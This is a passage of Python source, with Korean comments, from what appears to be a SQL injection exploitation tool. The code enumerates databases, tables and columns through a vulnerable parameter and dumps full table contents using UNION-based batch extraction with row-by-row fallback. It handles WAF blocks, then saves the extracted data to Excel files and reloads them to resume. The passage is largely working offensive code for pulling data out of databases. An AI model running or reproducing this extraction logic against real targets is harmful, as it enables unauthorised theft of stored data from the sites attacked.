                    break
                try:
                    raw = _union_extract(ctx, _q_batch_list(ctx, base_select, i, 1))
                except WAFBlockedError:
                    raise
                except InterruptedError:
                    raise
                except Exception:
                    raw = None
                if raw is not None:
                    items.append(raw.strip())
                if progress_cb:
                    progress_cb(i + 1, cnt)

        n += window
    return items


def _list_items(ctx: ExtractCtx, count_q: str,
                row_q_fn: Callable[[int], str],
                batch_base_select: Optional[str] = None,
                progress_cb: Optional[Callable[[int, int], None]] = None
                ) -> List[str]:
    """count + 페이지네이션 루프로 문자열 목록을 추출하는 공용 헬퍼.

    list_databases / list_tables / list_columns가 공유한다.
    UNION 기법 + union_row_batch > 1 + batch_base_select 제공 시 묶음 경로로 분기.
    """
    cnt = _extract_int(ctx, count_q)
    if cnt is None or cnt <= 0:
        return []

    # UNION 묶음 경로
    if (ctx.technique == "union" and ctx.union_row_batch > 1
            and batch_base_select is not None):
        return _list_items_batch(ctx, cnt, batch_base_select, progress_cb)

    # 기존 1개씩 경로
    items: List[str] = []
    for n in range(cnt):
        if ctx.cancelled:
            break
        name = _extract_single(ctx, row_q_fn(n))
        if name is not None:
            items.append(name.strip())
        if progress_cb:
            progress_cb(n + 1, cnt)
    return items


def list_databases(ctx: ExtractCtx,
                   progress_cb: Optional[Callable[[int, int], None]] = None
                   ) -> List[str]:
    """전체 DB(스키마) 목록 추출."""
    if ctx.dbms == "SQLite":
        if progress_cb:
            progress_cb(1, 1)
        return ["main"]
    return _list_items(ctx, _q_count_databases(ctx.dbms),
                       lambda n: _q_row_databases(ctx.dbms, n),
                       batch_base_select=_q_base_databases(ctx.dbms),
                       progress_cb=progress_cb)


def list_tables(ctx: ExtractCtx, db: str,
                progress_cb: Optional[Callable[[int, int], None]] = None
                ) -> List[str]:
    """특정 DB의 테이블 목록 추출."""
    return _list_items(ctx, _q_count_tables(ctx.dbms, db),
                       lambda n: _q_row_tables(ctx.dbms, db, n),
                       batch_base_select=_q_base_tables(ctx.dbms, db),
                       progress_cb=progress_cb)


def list_columns(ctx: ExtractCtx, db: str, table: str,
                 progress_cb: Optional[Callable[[int, int], None]] = None
                 ) -> List[str]:
    """특정 테이블의 컬럼 목록 추출."""
    return _list_items(ctx, _q_count_columns(ctx.dbms, db, table),
                       lambda n: _q_row_columns(ctx.dbms, db, table, n),
                       batch_base_select=_q_base_columns(ctx.dbms, db, table),
                       progress_cb=progress_cb)


def count_table(ctx: ExtractCtx, db: str, table: str) -> Optional[int]:
    """테이블 전체 행 수 추출 (estimate / dump 공용)."""
    qdb = _qid(ctx, db)
    qtbl = _qid(ctx, table)
    if ctx.dbms == "SQLite":
        total_q = f"SELECT COUNT(*) FROM {qtbl}"
    elif ctx.dbms == "MSSQL":
        total_q = f"SELECT COUNT(*) FROM {qdb}.dbo.{qtbl}"
    else:
        total_q = f"SELECT COUNT(*) FROM {qdb}.{qtbl}"
    return _extract_int(ctx, total_q)


def dump_table(ctx: ExtractCtx, db: str, table: str, columns: List[str],
               total: Optional[int] = None,
               progress_cb: Optional[Callable[[int, int], None]] = None,
               rows_out: Optional[List[List[str]]] = None,
               ) -> List[List[str]]:
    """행 단위 데이터 추출 — 처음부터 끝까지 전체 행 추출 + DUMP_DELIM split.

    total 전달 시 COUNT 요청 생략. 미전달 시 내부에서 count_table 호출.
    ctx.cancelled 가 True 로 바뀌면 InterruptedError를 전파한다 — 호출부가
    부분 결과를 보존한 뒤 중단/취소 처리를 담당한다.

    rows_out 전달 시 해당 리스트에 행을 append (호출부가 미리 등록한 경우
    dump 도중 취소되어도 누적 행이 보존됨).

    UNION 기법 + union_row_batch > 1이면 집계 함수로 묶음 추출을 시도한다.
    묶음 결과가 None이거나 기대 행 수보다 적으면(한계 초과·잘림) 해당 윈도우만
    기존 1행씩 경로로 자동 폴백 — 속도와 정확성을 동시에 보장한다.
    """
    if not columns:
        return [] if rows_out is None else rows_out

    # total 미전달 시 COUNT 추출
    if total is None:
        total = count_table(ctx, db, table) or 0

    row_select = _build_row_select(ctx, columns)
    # rows_out이 전달되면 해당 리스트를 공유 — 취소 시에도 누적 행 보존
    rows: List[List[str]] = rows_out if rows_out is not None else []
    # 이어받기: 기존 행 수를 오프셋으로 사용 (0이면 처음부터)
    start = len(rows)

    # ── UNION 묶음 추출 경로 (union_row_batch > 1) ────────────────────────────
    if ctx.technique == "union" and ctx.union_row_batch > 1:
        batch = ctx.union_row_batch
        n = start
        while n < total:
            if ctx.cancelled:
                break
            window = min(batch, total - n)  # 마지막 윈도우는 남은 행 수만큼

            # 묶음 쿼리 — 실패(None) 시 윈도우 전체 폴백
            try:
                batch_query = _q_row_dump_batch(ctx, db, table, row_select, n, window)
                raw_batch = _union_extract(ctx, batch_query)
            except WAFBlockedError:
                raise
            except InterruptedError:
                raise
            except Exception:
                raw_batch = None

            if raw_batch is None:
                # 묶음 추출 실패 — 윈도우 전체를 1행씩 폴백
                for i in range(n, n + window):
                    if ctx.cancelled:
                        break
                    try:
                        raw = _extract_single(ctx, _q_row_dump(ctx, db, table, row_select, i))
                    except WAFBlockedError:
                        raise
                    except InterruptedError:
                        raise
                    except Exception:
                        raw = None
                    rows.append(_parse_row_raw(raw, len(columns)))
                    if progress_cb:
                        progress_cb(i + 1, total)
                n += window
                continue

            # 묶음 결과를 행 단위로 분리
            raw_rows = raw_batch.split(ROW_DELIM)
            got = len(raw_rows)

            for ri, raw_row in enumerate(raw_rows[:window]):
                if ctx.cancelled:
                    break
                rows.append(_parse_row_raw(raw_row, len(columns)))
                if progress_cb:
                    progress_cb(n + ri + 1, total)

            # 잘림 감지 — 기대 행 수보다 적으면 나머지 구간 1행씩 폴백
            if got < window:
                fallback_start = n + got
                fallback_end = n + window
                for i in range(fallback_start, fallback_end):
                    if ctx.cancelled:
                        break
                    try:
                        raw = _extract_single(ctx, _q_row_dump(ctx, db, table, row_select, i))
                    except WAFBlockedError:
                        raise
                    except InterruptedError:
                        raise
                    except Exception:
                        raw = None
                    rows.append(_parse_row_raw(raw, len(columns)))
                    if progress_cb:
                        progress_cb(i + 1, total)

            n += window
        return rows

    # ── 기존 1행씩 추출 경로 (묶음 미사용 또는 UNION 외 기법) ────────────────
    for n in range(start, total):
        if ctx.cancelled:
            break
        try:
            raw = _extract_single(ctx, _q_row_dump(ctx, db, table, row_select, n))
        except WAFBlockedError:
            raise
        except InterruptedError:
            # 취소 신호 — 부분 결과를 rows에 남긴 채 전파
            raise
        except Exception:
            raw = None
        rows.append(_parse_row_raw(raw, len(columns)))
        if progress_cb:
            progress_cb(n + 1, total)

    return rows


# ── 엑셀 저장 ───────────────────────────────────────────────────────────────

def _safe_sheet_name(name: str, used: set) -> str:
    """시트명 sanitize + 31자 truncate + 중복 dedup + 예약 이름 회피.

    엑셀 시트명 제약:
    - 31자 이하
    - 금지문자: \\ / * ? : [ ]
    - 시작/끝에 ' 금지
    - INFO 등 RESERVED_SHEETS 이름 충돌 시 _t suffix
    """
    name = _INVALID_SHEET_CHARS.sub("_", name)
    name = name.strip("'")
    base = (name[:31] or "sheet")
    if base.upper() in RESERVED_SHEETS:
        base = (base[:29] + "_t") if len(base) >= 30 else (base + "_t")
    cand, i = base, 2
    while cand in used:
        suffix = f"_{i}"
        cand = base[:31 - len(suffix)] + suffix
        i += 1
        if i > 999:
            raise ValueError("sheet name dedup overflow")
    used.add(cand)
    return cand


def _safe_filename(name: str) -> str:
    """파일명 sanitize — path traversal · 예약어 · 금지문자 차단."""
    name = _INVALID_FILE_CHARS.sub("_", name)
    name = name.replace("..", "_")  # path traversal 차단
    name = name.strip(". ")          # Windows: 끝 공백/점 제거
    if name.upper() in _RESERVED_FILENAMES:
        name = "_" + name
    return name[:80] or "extract"


def _safe_cell_value(v: Any) -> str:
    """엑셀 formula injection 차단 — 위험 prefix는 ' 추가하여 문자열 강제."""
    if v is None:
        return ""
    s = str(v)
    if s.startswith(_FORMULA_PREFIX):
        return "'" + s
    return s


def _restore_cell_value(v: Any) -> str:
    """엑셀에서 읽은 셀 값의 formula injection 방어 prefix(' ) 제거."""
    if v is None:
        return ""
    s = str(v)
    # _safe_cell_value가 위험 prefix 앞에 붙인 ' 를 제거
    if len(s) >= 2 and s[0] == "'" and s[1] in ("=", "+", "-", "@", "\t", "\r"):
        return s[1:]
    return s


def save_to_excel(extracted: Dict[str, Any], target_url: str,
                  output_dir: str, excel_name: Optional[str] = None) -> List[str]:
    """추출 결과를 엑셀 파일로 저장.

    마스터 파일 (extract_<name>_DBfingerprint.xlsx):
      - INFO 시트: 메타 + Fingerprint 결과(DBMS/기법/컨텍스트/UNION 정보)
      - DBList 시트: 추출된 DB 목록

    DB별 파일 (extract_<name>_<db>.xlsx):
      - INFO 시트: 메타
      - _TableMap 시트: 시트명 ↔ 원본 테이블명 (복원 시 정확한 테이블명 보장)
      - <테이블별> 시트: 1행=컬럼 헤더, 2행~=행 데이터

    excel_name이 None이면 "extract"를 사용한다.
    파일명은 항상 고정 — 동일 이름으로 호출 시 덮어쓰기.
    """
    from openpyxl import Workbook  # lazy import — 추출 모드 진입 시점에만 필요

    os.makedirs(output_dir, exist_ok=True)
    saved_paths: List[str] = []
    safe_name = _safe_filename(excel_name or "extract")

    # 1. 마스터 파일 항상 생성 (INFO + DBList)
    master_wb = Workbook()
    master_info_ws = master_wb.active
    master_info_ws.title = "INFO"
    _write_info_sheet(master_info_ws, extracted, "")

    dblist_ws = master_wb.create_sheet(title="DBList")
    dblist_ws.append(["DB명"])
    for db in (extracted.get("databases") or []):
        dblist_ws.append([_safe_cell_value(db)])

    master_path = os.path.join(output_dir, f"extract_{safe_name}_DBfingerprint.xlsx")
    master_wb.save(master_path)
    saved_paths.append(os.path.abspath(master_path))

    # 2. DB별 파일 생성
    dumps: Dict[str, Dict[str, Any]] = extracted.get("dumps", {}) or {}
    tables_index: Dict[str, List[str]] = extracted.get("tables", {}) or {}

    by_db: Dict[str, List[Tuple[str, Dict[str, Any]]]] = {}
    for key, payload in dumps.items():
        if "." in key:
            db, tbl = key.split(".", 1)
        else:
            db, tbl = "default", key
        by_db.setdefault(db, []).append((tbl, payload))

    for db in tables_index:
        by_db.setdefault(db, [])

    for db, tbl_list in by_db.items():
        wb = Workbook()
        info_ws = wb.active
        info_ws.title = "INFO"
        _write_info_sheet(info_ws, extracted, db)

        # _TableMap 시트 — 시트명 ↔ 원본 테이블명 매핑 (load_from_excel 복원용)
        used_sheets: set = {"INFO", "_TABLEMAP"}
        tmap_ws = wb.create_sheet(title="_TableMap")
        tmap_ws.append(["시트명", "원본 테이블명"])

        # dump된 테이블을 O(1) 조회용 dict으로 변환
        dump_dict: Dict[str, Dict[str, Any]] = {tbl: payload for tbl, payload in tbl_list}

        # tables_index 순서를 기준으로, dumps에만 존재하는 테이블은 뒤에 추가
        ordered_tables = list(tables_index.get(db, []))
        ordered_set = set(ordered_tables)
        for tbl in dump_dict:
            if tbl not in ordered_set:
                ordered_tables.append(tbl)

        for tbl in ordered_tables:
            sheet_name = _safe_sheet_name(tbl, used_sheets)
            tmap_ws.append([_safe_cell_value(sheet_name), _safe_cell_value(tbl)])
            ws = wb.create_sheet(title=sheet_name)
            col_key = f"{db}.{tbl}"
            payload = dump_dict.get(tbl)
            if payload:
                # 행데이터까지 추출된 테이블 — 헤더 + 행 기록
                cols = payload.get("columns") or []
                rows = payload.get("rows") or []
                ws.append([_safe_cell_value(c) for c in cols])
                for r in rows:
                    ws.append([_safe_cell_value(v) for v in r])
            else:
                # 리스트만 추출된 테이블 — 컬럼 헤더만 (또는 빈 시트)
                cached_cols = (extracted.get("columns") or {}).get(col_key, [])
                if cached_cols:
                    ws.append([_safe_cell_value(c) for c in cached_cols])

        db_path = os.path.join(output_dir,
                               f"extract_{safe_name}_{_safe_filename(db)}.xlsx")
        wb.save(db_path)
        saved_paths.append(os.path.abspath(db_path))

    return saved_paths


def _write_info_sheet(ws, extracted: Dict[str, Any], db_name: str) -> None:
    """INFO 시트 — 메타 + dbms_info + UNION 정보 한 줄씩 기록.

    Union 관련 행은 load_from_excel 복원 시 ctx 재구성에 사용된다.
    """
    meta = extracted.get("meta", {}) or {}
    info = extracted.get("dbms_info", {}) or {}
    ctx_val = meta.get("context")
    union_types = meta.get("union_types") or []
    rows = [
        ("Target",        meta.get("target", "")),
        ("Method",        meta.get("method", "")),
        ("Body Type",     meta.get("body_type", "")),
        ("Param",         meta.get("param", "")),
        ("DBMS",          meta.get("dbms", "")),
        ("Technique",     meta.get("technique", "")),
        ("Context",       "" if ctx_val is None else ctx_val),
        ("Database",      db_name),
        ("Started",       meta.get("started_at", "")),
        ("Finished",      meta.get("finished_at", "")),
        ("Version",       info.get("version", "")),
        ("User",          info.get("user", "")),
        ("Current DB",    info.get("current_db", "")),
        # UNION 정보 — load_from_excel 복원 전용
        ("Union Columns", str(meta.get("union_columns") or 0)),
        ("Union Types",   ",".join(str(t) for t in union_types)),
        ("Union Visible", str(meta.get("union_visible_idx", -1)
                             if meta.get("union_visible_idx") is not None else -1)),
    ]
    for k, v in rows:
        ws.append([_safe_cell_value(k), _safe_cell_value(v)])


# ── 누적 dict 초기화 헬퍼 (호출부 공용) ─────────────────────────────────────

def init_extracted(ctx: ExtractCtx) -> Dict[str, Any]:
    """추출 결과 누적 dict의 표준 초기 형태를 생성한다.

    meta.finished_at은 종료 시점에 호출부가 직접 채워 넣는다.
    """
    return {
        "meta": {
            "target":           ctx.target_url,
            "method":           ctx.method,
            "body_type":        ctx.body_type,
            "param":            ctx.vuln_param,
            "dbms":             ctx.dbms,
            "technique":        ctx.technique,
            "context":          ctx.quote_context,
            "started_at":       datetime.now().isoformat(),
            "finished_at":      "",
            "union_columns":    ctx.union_columns,
            "union_types":      list(ctx.union_types),
            "union_visible_idx": ctx.union_visible_idx,
        },
        "dbms_info": {"version": "", "user": "", "current_db": ""},
        "databases": [],
        "tables":    {},
        "columns":   {},
        "dumps":     {},
    }


def find_existing_extract(excel_name: str,
                          output_dir: str) -> Optional[Dict[str, Any]]:
    """excel_name의 마스터 파일 존재 여부 확인 + 요약 반환.

    파일이 없거나 읽기 실패 시 None 반환.
    있으면 {dbms, technique, context, union_columns, union_types,
            union_visible_idx, db_count} 반환.
    """
    from openpyxl import load_workbook  # noqa: F401 (lazy)

    safe_name = _safe_filename(excel_name)
    master_path = os.path.join(output_dir, f"extract_{safe_name}_DBfingerprint.xlsx")
    if not os.path.exists(master_path):
        return None

    try:
        wb = load_workbook(master_path, read_only=True, data_only=True)
        info_map: Dict[str, str] = {}
        if "INFO" in wb.sheetnames:
            for row in wb["INFO"].iter_rows(values_only=True):
                if row and len(row) >= 2 and row[0] is not None:
                    info_map[str(row[0])] = str(row[1]) if row[1] is not None else ""

        db_count = 0
        if "DBList" in wb.sheetnames:
            db_count = max(0, (wb["DBList"].max_row or 1) - 1)
        wb.close()

        union_types_raw = info_map.get("Union Types", "") or ""
        return {
            "dbms":             info_map.get("DBMS", ""),
            "technique":        info_map.get("Technique", ""),
            "context":          info_map.get("Context", ""),
            "union_columns":    int(info_map.get("Union Columns", "0") or "0"),
            "union_types":      [t for t in union_types_raw.split(",") if t],
            "union_visible_idx": int(info_map.get("Union Visible", "-1") or "-1"),
            "db_count":         db_count,
        }
    except Exception:
        return None


def load_from_excel(excel_name: str,
                    output_dir: str
                    ) -> Optional[Tuple[Dict[str, Any], Dict[str, Any]]]:
    """엑셀 파일에서 이전 추출 결과를 복원.

    Returns (extracted_dict, ctx_meta_dict) or None.

    extracted_dict: init_extracted()와 동일 구조
    ctx_meta_dict : {dbms, technique, context, union_columns, union_types,
                     union_visible_idx} — fingerprint 자동탐지 생략에 사용
    """
    from openpyxl import load_workbook  # noqa: F401 (lazy)

    safe_name = _safe_filename(excel_name)
    master_path = os.path.join(output_dir, f"extract_{safe_name}_DBfingerprint.xlsx")
    if not os.path.exists(master_path):
        return None

    extracted: Dict[str, Any] = {
        "meta": {}, "dbms_info": {"version": "", "user": "", "current_db": ""},
        "databases": [], "tables": {}, "columns": {}, "dumps": {},
    }
    ctx_meta: Dict[str, Any] = {}

    try:
        wb = load_workbook(master_path, read_only=True, data_only=True)

        if "INFO" in wb.sheetnames:
            info_map: Dict[str, str] = {}
            for row in wb["INFO"].iter_rows(values_only=True):
                if row and len(row) >= 2 and row[0] is not None:
                    info_map[str(row[0])] = (
                        _restore_cell_value(row[1]) if row[1] is not None else "")

            union_types = [t for t in
                           (info_map.get("Union Types", "") or "").split(",") if t]
            extracted["meta"] = {
                "target":           info_map.get("Target", ""),
                "method":           info_map.get("Method", ""),
                "body_type":        info_map.get("Body Type", ""),
                "param":            info_map.get("Param", ""),
                "dbms":             info_map.get("DBMS", ""),
                "technique":        info_map.get("Technique", ""),
                "context":          info_map.get("Context", ""),
                "started_at":       info_map.get("Started", ""),
                "finished_at":      info_map.get("Finished", ""),
                "union_columns":    int(info_map.get("Union Columns", "0") or "0"),
                "union_types":      union_types,
                "union_visible_idx": int(info_map.get("Union Visible", "-1") or "-1"),
            }
            extracted["dbms_info"] = {
                "version":    info_map.get("Version", ""),
                "user":       info_map.get("User", ""),
                "current_db": info_map.get("Current DB", ""),
            }
            ctx_meta = {
                "dbms":             info_map.get("DBMS", ""),
                "technique":        info_map.get("Technique", ""),
                "context":          info_map.get("Context", ""),  # "" = numeric
                "union_columns":    int(info_map.get("Union Columns", "0") or "0"),
                "union_types":      union_types,
                "union_visible_idx": int(info_map.get("Union Visible", "-1") or "-1"),
            }

        if "DBList" in wb.sheetnames:
            dbs: List[str] = []
            first_row = True
            for row in wb["DBList"].iter_rows(values_only=True):
                if first_row:
                    first_row = False
                    continue  # 헤더("DB명") 건너뜀
                if row and row[0] is not None:
                    dbs.append(_restore_cell_value(row[0]))
            extracted["databases"] = dbs

        wb.close()
    except Exception:
        return None

    # DB별 파일 복원
    for db in extracted.get("databases", []):
        db_fname = f"extract_{safe_name}_{_safe_filename(db)}.xlsx"
        db_path = os.path.join(output_dir, db_fname)
        if not os.path.exists(db_path):
            continue
        try:
            wb = load_workbook(db_path, read_only=True, data_only=True)

            # _TableMap → 원본 테이블명 (순서 보존)
            tmap: Dict[str, str] = {}  # sheet_name → original_table_name
            if "_TableMap" in wb.sheetnames:
                first_row = True
                for row in wb["_TableMap"].iter_rows(values_only=True):
                    if first_row:
                        first_row = False
                        continue
                    if row and len(row) >= 2 and row[0] and row[1] is not None:
                        tmap[str(row[0])] = _restore_cell_value(row[1])

            extracted.setdefault("tables", {})[db] = list(tmap.values())

            for sheet_nm, orig_nm in tmap.items():
                if sheet_nm not in wb.sheetnames:
                    continue
                col_key = f"{db}.{orig_nm}"
                all_rows = list(wb[sheet_nm].iter_rows(values_only=True))
                if not all_rows:
                    continue

                header = [_restore_cell_value(v) for v in all_rows[0]]
                extracted.setdefault("columns", {})[col_key] = header

                data_rows = [
                    [_restore_cell_value(v) for v in r]
                    for r in all_rows[1:]
                ]
                if data_rows:
                    extracted.setdefault("dumps", {})[col_key] = {
                        "columns": header, "rows": data_rows,
                    }

            wb.close()
        except Exception:
            continue

    return extracted, ctx_meta
